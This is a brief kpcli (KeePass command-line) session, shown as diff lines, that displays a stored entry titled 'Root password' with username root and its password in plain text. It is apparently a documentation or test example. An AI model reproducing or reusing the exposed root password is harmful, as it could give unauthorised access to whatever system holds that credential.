+kpcli:/MyPasswords> show -a -f 0        
+
+Title: Root password                    
+Uname: root                             
+ Pass: u3v2249dl9ptv465cogl3cnpo3fyhk   
+  URL:                                  
+Notes:                                  
+Icon#: 0                                
+Creat: 2019-05-13 14:32:47              
+Modif: 2019-05-13 14:34:09              
+Xpire: Never                            
+
+kpcli:/MyPasswords>                     
